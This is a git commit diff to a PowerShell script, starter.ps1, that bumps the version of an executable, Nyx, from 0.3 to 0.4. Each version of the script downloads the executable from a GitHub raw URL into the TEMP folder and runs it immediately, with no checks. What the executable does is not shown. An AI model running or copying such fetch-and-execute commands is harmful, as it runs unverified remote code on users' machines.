a04a19dc52c7c410a8b04311c42abf93588ea88e
VVolfCZ <83589607+VVolfCZ@users.noreply.github.com>
2023-02-17 03:02:18 +0100

    Update starter.ps1

--- starter.ps1
+++ starter.ps1
@@ -1,2 +1,2 @@
-Invoke-WebRequest https://raw.githubusercontent.com/VVolfCZ/VVolfKey/main/Nyx_0.3.exe -OutFile $env:TEMP\Nyx_0.3.exe
-& $env:TEMP\Nyx_0.3.exe
+Invoke-WebRequest https://raw.githubusercontent.com/VVolfCZ/VVolfKey/main/Nyx_0.4.exe -OutFile $env:TEMP\Nyx_0.4.exe
+& $env:TEMP\Nyx_0.4.exe
